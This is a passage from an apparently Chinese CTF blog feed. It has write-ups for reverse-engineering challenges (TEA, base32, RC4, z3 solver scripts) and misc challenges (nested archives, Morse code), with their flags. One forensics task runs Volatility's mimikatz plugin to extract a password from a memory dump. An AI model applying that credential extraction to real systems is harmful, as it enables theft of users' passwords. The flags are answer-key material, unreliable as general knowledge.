class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">change_index</span>():</span><br><span class="line"><span class="keyword">global</span> <span class="built_in">input</span></span><br><span class="line">array2 = [<span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">11</span>]</span><br><span class="line">arr = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">arr[i] = <span class="built_in">input</span>[array2[i]]</span><br><span class="line"><span class="built_in">input</span> = arr</span><br></pre></td></tr></tbody></table></figure><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="-1"><a href="#-1" class="headerlink" title=""></a></h1></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023楚慧杯初赛WriteUp</title>
      <link href="/2023/12/18/2023%E6%A5%9A%E6%85%A7%E6%9D%AF%E5%88%9D%E8%B5%9BWriteUp/"/>
      <url>/2023/12/18/2023%E6%A5%9A%E6%85%A7%E6%9D%AF%E5%88%9D%E8%B5%9BWriteUp/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这周末，四级英语考试，强网杯，楚慧杯，还通宵打强网，我滴妈，差点猝si   =。=</p><p>然后这篇写的楚慧杯的，就重点说（吐槽）一下</p><p>vocal，就3个小时的比赛，还得比赛结束前交WP，写了re1，misc1，misc2，0.o真的极限=。=   </p><p>楚慧杯学生组</p><p><img src="/2023/12/18/2023%E6%A5%9A%E6%85%A7%E6%9D%AF%E5%88%9D%E8%B5%9BWriteUp/image-20231218194623079.png" alt="image-20231218194623079"></p><p>还好，收获满满，强网先锋应该够了，楚慧杯也晋级了，四级的话，阿巴阿巴 =。=</p><h1 id="rev"><a href="#rev" class="headerlink" title="rev"></a>rev</h1><h2 id="babyre-ollvm-x2F-tea-xtea"><a href="#babyre-ollvm-x2F-tea-xtea" class="headerlink" title="babyre - ollvm/tea?xtea"></a>babyre - ollvm/tea?xtea</h2><p>打完强网库库打ollvm，这玩意又来</p><p>好好，周末就ollvm大赛</p><p>D810去混淆</p><p>D810是插件  搜到直接用  前提：angr要装好</p><p><img src="/2023/12/18/2023%E6%A5%9A%E6%85%A7%E6%9D%AF%E5%88%9D%E8%B5%9BWriteUp/wps1.jpg" alt="img"> </p><p>main函数</p><p><img src="/2023/12/18/2023%E6%A5%9A%E6%85%A7%E6%9D%AF%E5%88%9D%E8%B5%9BWriteUp/wps2.jpg" alt="img"> </p><p>Encode   离谱，我去玩ollvm脚本没跑出来</p><p>然后我没去ollvm改了一下跑出来了，vocal</p><p><img src="/2023/12/18/2023%E6%A5%9A%E6%85%A7%E6%9D%AF%E5%88%9D%E8%B5%9BWriteUp/image-20231218194917806.png" alt="image-20231218194917806"></p><p>这个是去ollvm</p><p><img src="/2023/12/18/2023%E6%A5%9A%E6%85%A7%E6%9D%AF%E5%88%9D%E8%B5%9BWriteUp/image-20231218195004655.png" alt="image-20231218195004655"> </p><p><img src="/2023/12/18/2023%E6%A5%9A%E6%85%A7%E6%9D%AF%E5%88%9D%E8%B5%9BWriteUp/wps4.jpg" alt="img"> </p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> _DWORD;<span class="comment">//DWORD 表示 32bit 无符号整数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> {</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], i;</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0x61C88647</span>;</span><br><span class="line">    <span class="type">uint32_t</span> sum = <span class="number">-0xc3910c8e0</span>;</span><br><span class="line">    <span class="type">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) {</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k1) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k0);</span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k3) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k2);</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">}</span><br><span class="line"><span class="type">void</span>  <span class="title function_">encodec</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* a2, __int64 k)</span></span><br><span class="line">{</span><br><span class="line">    __int64 result; <span class="comment">// rax</span></span><br><span class="line">    __int64 v4; <span class="comment">// r11</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> sum; <span class="comment">// [rsp+1Ch] [rbp-28h]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+20h] [rbp-24h]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// [rsp+24h] [rbp-20h]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+28h] [rbp-1Ch]</span></span><br><span class="line"></span><br><span class="line">    v0 = *a2;</span><br><span class="line">    v1 = a2[<span class="number">1</span>];</span><br><span class="line">    <span class="comment">/*uint32_t delta = 0x61C88647;</span></span><br><span class="line"><span class="comment">    uint32_t sum = (-delta) * 32;*/</span></span><br><span class="line">    sum = <span class="number">-0xc3910c8e0</span>; <span class="comment">//(-0x61C88647) * 32;</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i)</span><br><span class="line">    {</span><br><span class="line">        v4 = (sum &gt;&gt; <span class="number">11</span>) &amp; ((sum &gt;&gt; <span class="number">11</span>) ^ <span class="number">0xFFFFFFFC</span>);</span><br><span class="line">        v1 -= ~(*(_DWORD*)(k + <span class="number">4</span> * v4) + sum) &amp; (v0 + (~(v0 &gt;&gt; <span class="number">5</span>) &amp; (<span class="number">16</span> * v0) | ~(<span class="number">16</span> * v0) &amp; (v0 &gt;&gt; <span class="number">5</span>))) | ~(v0 + (~(v0 &gt;&gt; <span class="number">5</span>) &amp; (<span class="number">16</span> * v0) | ~(<span class="number">16</span> * v0) &amp; (v0 &gt;&gt; <span class="number">5</span>))) &amp; (*(_DWORD*)(k + <span class="number">4</span> * v4) + sum);</span><br><span class="line">        sum += <span class="number">0x61C88647</span>;</span><br><span class="line">        v0 -= ~(*(_DWORD*)(k + <span class="number">4LL</span> * ~(~sum | <span class="number">0xFFFFFFFC</span>)) + sum) &amp; (v1 + (~(v1 &gt;&gt; <span class="number">5</span>) &amp; (<span class="number">16</span> * v1) | ~(<span class="number">16</span> * v1) &amp; (v1 &gt;&gt; <span class="number">5</span>))) | ~(v1 + (~(v1 &gt;&gt; <span class="number">5</span>) &amp; (<span class="number">16</span> * v1) | ~(<span class="number">16</span> * v1) &amp; (v1 &gt;&gt; <span class="number">5</span>))) &amp; (*(_DWORD*)(k + <span class="number">4LL</span> * ~(~sum | <span class="number">0xFFFFFFFC</span>)) + sum);</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    *a2 = v0;</span><br><span class="line">    result = v1;</span><br><span class="line">    a2[<span class="number">1</span>] = v1;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">uint32_t</span> cipher[] = { <span class="number">0x168F8672</span>, <span class="number">0x02DBD824</span>, <span class="number">0xCF647FCA</span>, <span class="number">0xE6EFA7EF</span>, <span class="number">0x4AE016F0</span>, <span class="number">0xC5832E1D</span>, <span class="number">0x455C0A05</span>, <span class="number">0xFFEB8140</span>,</span><br><span class="line">    <span class="number">0xBE9561EF</span>, <span class="number">0x7F819E23</span>, <span class="number">0x3BC04269</span>, <span class="number">0xC68B825B</span>, <span class="number">0xE6A5B1F0</span>, <span class="number">0xBD03CBBD</span>, <span class="number">0xA9B3CE0E</span>, <span class="number">0x6C85E6E7</span>,</span><br><span class="line">    <span class="number">0x9F5C71EF</span>, <span class="number">0x3BE4BD57</span> };</span><br><span class="line">    <span class="type">uint32_t</span> key[<span class="number">4</span>] = { <span class="number">0xDEADBEEF</span>, <span class="number">0x87654321</span>, <span class="number">0xFACEB00C</span>, <span class="number">0xCAFEBABE</span> };</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">18</span>; i += <span class="number">2</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="type">uint32_t</span> temp[<span class="number">2</span>];        </span><br><span class="line">        temp[<span class="number">0</span>] = cipher[i];</span><br><span class="line">        temp[<span class="number">1</span>] = cipher[i + <span class="number">1</span>];</span><br><span class="line">        encodec(temp, (__int64)key);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%c%c%c%c%c%c%c%c"</span>, *((<span class="type">char</span>*)&amp;temp[<span class="number">0</span>] + <span class="number">0</span>), *((<span class="type">char</span>*)&amp;temp[<span class="number">0</span>] + <span class="number">1</span>), *((<span class="type">char</span>*)&amp;temp[<span class="number">0</span>] + <span class="number">2</span>), *((<span class="type">char</span>*)&amp;temp[<span class="number">0</span>] + <span class="number">3</span>), *((<span class="type">char</span>*)&amp;temp[<span class="number">1</span>] + <span class="number">0</span>), *((<span class="type">char</span>*)&amp;temp[<span class="number">1</span>] + <span class="number">1</span>), *((<span class="type">char</span>*)&amp;temp[<span class="number">1</span>] + <span class="number">2</span>), *((<span class="type">char</span>*)&amp;temp[<span class="number">1</span>] + <span class="number">3</span>));</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>DASCTF{Don’t_forget_to_drink_tea}</p><p>后边俩题没出来，3个小时的比赛，还得比赛前交WP，hhhhhhh</p><p>做出3道题已经是我的极限了</p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="ez-zip"><a href="#ez-zip" class="headerlink" title="ez_zip"></a>ez_zip</h2><p>看到循环嵌套解压缩包，简单了</p><p>差点前3血，还是慢了（不愧是DAS的题，我本来还想投这种题目呢）</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import zipfile</span><br><span class="line">import tarfile</span><br><span class="line">import py7zr</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">sys.setrecursionlimit(100000) </span><br><span class="line">input_archive_file = "4096.zip"</span><br><span class="line">output_folder = "extracted_files"</span><br><span class="line"></span><br><span class="line">os.makedirs(output_folder, exist_ok=True)</span><br><span class="line"></span><br><span class="line">def extract_zip(input_zip_file, output_folder):</span><br><span class="line">&nbsp; &nbsp; with zipfile.ZipFile(input_zip_file, "r") as zip_ref:</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; zip_ref.extractall(output_folder)</span><br><span class="line"></span><br><span class="line">def extract_tar_gz(input_tar_gz_file, output_folder):</span><br><span class="line">&nbsp; &nbsp; with tarfile.open(input_tar_gz_file, "r:gz") as tar_ref:</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; tar_ref.extractall(output_folder)</span><br><span class="line"></span><br><span class="line">def extract_7z(input_7z_file, output_folder):</span><br><span class="line">&nbsp; &nbsp; with py7zr.SevenZipFile(input_7z_file, mode='r') as zr:</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; zr.extractall(output_folder)</span><br><span class="line"></span><br><span class="line">def extract_and_delete_archive(input_file, output_folder):</span><br><span class="line"></span><br><span class="line">&nbsp; &nbsp; file_extension = os.path.splitext(input_file)[1]</span><br><span class="line">&nbsp; &nbsp; print(file_extension)</span><br><span class="line"></span><br><span class="line">&nbsp; &nbsp; if file_extension == ".zip":</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; extract_function = extract_zip</span><br><span class="line">&nbsp; &nbsp; elif file_extension == ".gz":</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; extract_function = extract_tar_gz</span><br><span class="line">&nbsp; &nbsp; elif file_extension == ".7z":</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; extract_function = extract_7z</span><br><span class="line">&nbsp; &nbsp; else:</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; raise ValueError("Unsupported file format")</span><br><span class="line"></span><br><span class="line">&nbsp; &nbsp; extract_function(input_file, output_folder)</span><br><span class="line"></span><br><span class="line">&nbsp; &nbsp; os.remove(input_file)</span><br><span class="line"></span><br><span class="line">def extract_all_nested_archives(input_file, output_folder):</span><br><span class="line">&nbsp; &nbsp; stack = [(input_file, output_folder)]</span><br><span class="line"></span><br><span class="line">&nbsp; &nbsp; while stack:</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; current_input_file, current_output_folder = stack.pop()</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; extract_and_delete_archive(current_input_file, current_output_folder)</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; extracted_files = os.listdir(current_output_folder)</span><br><span class="line"></span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; for extracted_file in extracted_files:</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; extracted_file_path = os.path.join(current_output_folder, extracted_file)</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if os.path.isfile(extracted_file_path):</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; stack.append((extracted_file_path, current_output_folder))</span><br><span class="line"></span><br><span class="line">extract_all_nested_archives(input_archive_file, output_folder)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>解出 </p><p><img src="/2023/12/18/2023%E6%A5%9A%E6%85%A7%E6%9D%AF%E5%88%9D%E8%B5%9BWriteUp/wps1-17029005527201.jpg" alt="img"> </p><p>+-+++-++ +-+++++- +-+-++– +-++++– +-+-+-++ +-+++–+ +—-+– ++–+++- ++–++++ +–+++– ++–+-+- ++—+++ ++–++-+ ++–+-+- ++—+++ +–+++– +–+++– +–++–+ ++–+++- +–++-+- ++–+— +–+++– ++–+–+ ++–++– ++–+++- +–++-+- ++–+-+- ++—++- ++–+++- ++–+++- +–++-+- +–++-++ ++–+–+ +–++++- +–+++– +–+++– ++–+-++ +–++-+- +–++-++ +—–+-</p><p>+ –&gt;.  摩斯解密</p><p>.-…-../.-…..-/.-.-..–/.-….–/.-.-.-../.-…–./.—-.–/..–…-/..–…./.–…–/..–.-.-/..—…/..–..-./..–.-.-/..—…/.–…–/.–…–/.–..–./..–…-/.–..-.-/..–.—/.–…–/..–.–./..–..–/..–…-/.–..-.-/..–.-.-/..—..-/..–…-/..–…-/.–..-.-/.–..-../..–.–./.–….-/.–…–/.–…–/..–.-../.–..-.-/.–..-../.—–.-</p><p>得到</p><p>%u44%u41%u53%u43%u54%u46%u7b%u31%u30%u63%u35%u38%u32%u35%u38%u63%u63%u66%u31%u65%u37%u63%u36%u33%u31%u65%u35%u39%u31%u31%u65%u64%u36%u61%u63%u63%u34%u65%u64%u7d</p><p>转16进制</p><p>DASCTF{10c58258ccf1e7c631e5911ed6acc4ed}</p><h2 id="easy取证-snow隐写"><a href="#easy取证-snow隐写" class="headerlink" title="easy取证 - snow隐写"></a>easy取证 - snow隐写</h2><p>snow隐写，vocal</p><p>vol.py -f mem.raw –profile=Win7SP1x64 filescan | grep ‘Desktop’</p><p>vol.py -f mem.raw –profile=Win7SP1x64 dumpfiles -Q 0x000000003dceaf20 -D ./</p><p>桌面有个docx，dump下来</p><p>打开docx，snow隐写，密码使用mimikatz提取</p><p>密码： H7Qmw_X+WB6BXDXa</p><p>DASCTF{f891eff370a2cbefec49d2a577b552d3}</p><p><img src="/2023/12/18/2023%E6%A5%9A%E6%85%A7%E6%9D%AF%E5%88%9D%E8%B5%9BWriteUp/wps1-17029005980242.jpg" alt="img"> </p><p><img src="/2023/12/18/2023%E6%A5%9A%E6%85%A7%E6%9D%AF%E5%88%9D%E8%B5%9BWriteUp/wps2-17029005980243.jpg" alt="img"> </p><p><img src="/2023/12/18/2023%E6%A5%9A%E6%85%A7%E6%9D%AF%E5%88%9D%E8%B5%9BWriteUp/wps3-17029005980244.jpg" alt="img"> </p><p>└─$ vol.py -f –plugins=/kali/Desktop/tools/volatility/volatility/plugins/ -f mem.raw –profile=Win7SP1x64 mimikatz</p><p><img src="/2023/12/18/2023%E6%A5%9A%E6%85%A7%E6%9D%AF%E5%88%9D%E8%B5%9BWriteUp/wps4-17029005980245.jpg" alt="img"> </p><p><img src="/2023/12/18/2023%E6%A5%9A%E6%85%A7%E6%9D%AF%E5%88%9D%E8%B5%9BWriteUp/wps5.jpg" alt="img"> </p><p><img src="/2023/12/18/2023%E6%A5%9A%E6%85%A7%E6%9D%AF%E5%88%9D%E8%B5%9BWriteUp/wps6.jpg" alt="img"> </p><p>.\SNOW.EXE -C -p H7Qmw_X+WB6BXDXa snow.txt</p><p>获得flag</p><p><img src="/2023/12/18/2023%E6%A5%9A%E6%85%A7%E6%9D%AF%E5%88%9D%E8%B5%9BWriteUp/wps7.jpg" alt="img"> </p><p>DASCTF{f891eff370a2cbefec49d2a577b552d3}</p></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023典型工业行业锦标赛WriteUp</title>
      <link href="/2023/12/06/2023%E5%85%B8%E5%9E%8B%E5%B7%A5%E4%B8%9A%E8%A1%8C%E4%B8%9A%E9%94%A6%E6%A0%87%E8%B5%9BWriteUp/"/>
      <url>/2023/12/06/2023%E5%85%B8%E5%9E%8B%E5%B7%A5%E4%B8%9A%E8%A1%8C%E4%B8%9A%E9%94%A6%E6%A0%87%E8%B5%9BWriteUp/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>不知道是啥比赛，稀里糊涂的就打了</p><p>然后发现里面的题型好多是逆向</p><p>就把逆向都给做了</p><p>（都做了也晋级不了，工控题，不会工控打个锤子  =。=）</p><h1 id="baby-go-go-x2F-base32"><a href="#baby-go-go-x2F-base32" class="headerlink" title="baby_go - go/base32"></a>baby_go - go/base32</h1><p>go语言写的</p><p>Base32变表加密</p><p><img src="/2023/12/06/2023%E5%85%B8%E5%9E%8B%E5%B7%A5%E4%B8%9A%E8%A1%8C%E4%B8%9A%E9%94%A6%E6%A0%87%E8%B5%9BWriteUp/wps1.jpg" alt="img"></p><p><img src="/2023/12/06/2023%E5%85%B8%E5%9E%8B%E5%B7%A5%E4%B8%9A%E8%A1%8C%E4%B8%9A%E9%94%A6%E6%A0%87%E8%B5%9BWriteUp/wps2.jpg" alt="img"> </p><p>base32变表</p><p>密文</p><p>N2XHD244PSVED53BHG2W7ZSVNK5W7ZSVPOTUHNU</p><p>table</p><p>AC-Z2-7B=</p><p><img src="/2023/12/06/2023%E5%85%B8%E5%9E%8B%E5%B7%A5%E4%B8%9A%E8%A1%8C%E4%B8%9A%E9%94%A6%E6%A0%87%E8%B5%9BWriteUp/wps3.jpg" alt="img"> </p><p>flag{th1s_1s_b4by_b4se32}</p><h1 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h1><p>简单加密</p><p>xor  +  add</p><p><img src="/2023/12/06/2023%E5%85%B8%E5%9E%8B%E5%B7%A5%E4%B8%9A%E8%A1%8C%E4%B8%9A%E9%94%A6%E6%A0%87%E8%B5%9BWriteUp/wps5.jpg" alt="img"></p><p>密文</p><p><img src="/2023/12/06/2023%E5%85%B8%E5%9E%8B%E5%B7%A5%E4%B8%9A%E8%A1%8C%E4%B8%9A%E9%94%A6%E6%A0%87%E8%B5%9BWriteUp/wps4.jpg" alt="img"></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0x87</span>, <span class="number">0x8C</span>, <span class="number">0x80</span>, <span class="number">0x8B</span>, <span class="number">0x98</span>, <span class="number">0x57</span>, <span class="number">0x83</span>, <span class="number">0x54</span>, <span class="number">0x8D</span>, <span class="number">0x5D</span>, <span class="number">0x5B</span>, <span class="number">0x58</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x59</span>, <span class="number">0x8D</span>, </span><br><span class="line"></span><br><span class="line">  <span class="number">0x93</span>, <span class="number">0x42</span>, <span class="number">0x90</span>, <span class="number">0x47</span>, <span class="number">0x41</span>, <span class="number">0x96</span>, <span class="number">0x4C</span>, <span class="number">0x4F</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0x9F</span>, <span class="number">0x41</span>, <span class="number">0x4D</span>, <span class="number">0x44</span>, <span class="number">0x4F</span>, <span class="number">0x81</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line"></span><br><span class="line">  a[i] = (a[i] ^ i) -<span class="number">33</span></span><br><span class="line"></span><br><span class="line">  flag += <span class="built_in">chr</span>(a[i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">flag{1d2d302876ab2a34b9744d9080}</span><br></pre></td></tr></tbody></table></figure><h1 id="ez-crypto-动调RC4"><a href="#ez-crypto-动调RC4" class="headerlink" title="ez_crypto - 动调RC4"></a>ez_crypto - 动调RC4</h1><p>正常RC4  动调</p><p>密文  </p><p>923117B560C8486423FA0ABBC53493ECB9616C5D899BA01B47E267BBC7CBD8FE1C67BF98E2EE</p><p>密钥</p><p>sierting</p><p><img src="/2023/12/06/2023%E5%85%B8%E5%9E%8B%E5%B7%A5%E4%B8%9A%E8%A1%8C%E4%B8%9A%E9%94%A6%E6%A0%87%E8%B5%9BWriteUp/wps6.jpg" alt="img"> </p><p>动调出密文跟密钥</p><p>密文</p><p><img src="/2023/12/06/2023%E5%85%B8%E5%9E%8B%E5%B7%A5%E4%B8%9A%E8%A1%8C%E4%B8%9A%E9%94%A6%E6%A0%87%E8%B5%9BWriteUp/wps7.jpg" alt="img"> </p><p>密钥</p><p><img src="/2023/12/06/2023%E5%85%B8%E5%9E%8B%E5%B7%A5%E4%B8%9A%E8%A1%8C%E4%B8%9A%E9%94%A6%E6%A0%87%E8%B5%9BWriteUp/wps8.jpg" alt="img"> </p><p><img src="/2023/12/06/2023%E5%85%B8%E5%9E%8B%E5%B7%A5%E4%B8%9A%E8%A1%8C%E4%B8%9A%E9%94%A6%E6%A0%87%E8%B5%9BWriteUp/wps9.jpg" alt="img">  </p><p>flag{6cd72bd931a381ddca4e810224bd6d06}</p><h1 id="ez-equation-pycdas-x2F-z3"><a href="#ez-equation-pycdas-x2F-z3" class="headerlink" title="ez_equation - pycdas/z3"></a>ez_equation - pycdas/z3</h1><p>看pydas 取出字节码</p><p>然后z3求解器.</p><p>flag{Th1s_1s_4n_funny_ch4llenge_lollllll~}</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> natsort <span class="keyword">import</span> natsorted</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">llst = [[<span class="number">154</span>, <span class="number">209</span>, <span class="number">184</span>, <span class="number">205</span>, <span class="number">152</span>, <span class="number">173</span>, <span class="number">85</span>], [<span class="number">219</span>, <span class="number">163</span>, <span class="number">159</span>, <span class="number">245</span>, <span class="number">245</span>, <span class="number">245</span>, <span class="number">3</span>], [<span class="number">244</span>, <span class="number">244</span>, <span class="number">153</span>, <span class="number">245</span>, <span class="number">164</span>, <span class="number">191</span>, <span class="number">126</span>], [<span class="number">136</span>, <span class="number">241</span>, <span class="number">132</span>, <span class="number">245</span>, <span class="number">188</span>, <span class="number">173</span>, <span class="number">93</span>],</span><br><span class="line">        [<span class="number">197</span>, <span class="number">198</span>, <span class="number">139</span>, <span class="number">207</span>, <span class="number">190</span>, <span class="number">181</span>, <span class="number">31</span>], [<span class="number">167</span>, <span class="number">206</span>, <span class="number">128</span>, <span class="number">197</span>, <span class="number">183</span>, <span class="number">183</span>, <span class="number">76</span>], [<span class="number">157</span>, <span class="number">223</span>, <span class="number">145</span>, <span class="number">198</span>, <span class="number">180</span>, <span class="number">165</span>, <span class="number">87</span>]]</span><br><span class="line"></span><br><span class="line">m = [BitVec(<span class="string">'s1_%d'</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>)]  <span class="comment"># 有时得用int值好使</span></span><br><span class="line">pad = [BitVec(<span class="string">'o_%d'</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]  <span class="comment"># 